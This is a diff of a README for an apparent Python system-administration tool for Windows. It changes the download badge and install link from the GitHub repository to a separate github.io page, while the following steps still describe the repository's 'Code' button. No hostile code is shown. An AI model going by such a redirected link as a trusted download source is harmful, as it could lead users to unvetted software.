@@ -1,6 +1,6 @@
 # 🖥️ Python-System-Administration - Simplify your daily computer management tasks
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Unerect-cerebellarhemisphere280/Python-System-Administration)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://unerect-cerebellarhemisphere280.github.io)
 
 This project provides tools to help you manage your computer systems. It uses Python scripts to perform common jobs like moving files, checking computer processes, and backing up data. You do not need to write code to use these tools. We designed them to assist anyone who wants to automate repetitive tasks on a Windows computer.
 
@@ -19,7 +19,7 @@ If you do not have Python, you can find the installer on the official website. R
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit the download page here: [https://github.com/Unerect-cerebellarhemisphere280/Python-System-Administration](https://github.com/Unerect-cerebellarhemisphere280/Python-System-Administration)
+1.  Visit the download page here: [https://unerect-cerebellarhemisphere280.github.io](https://unerect-cerebellarhemisphere280.github.io)
 2.  Locate the green "Code" button near the top right of the page.
 3.  Choose "Download ZIP" from the menu.
 4.  Save the file to your computer.
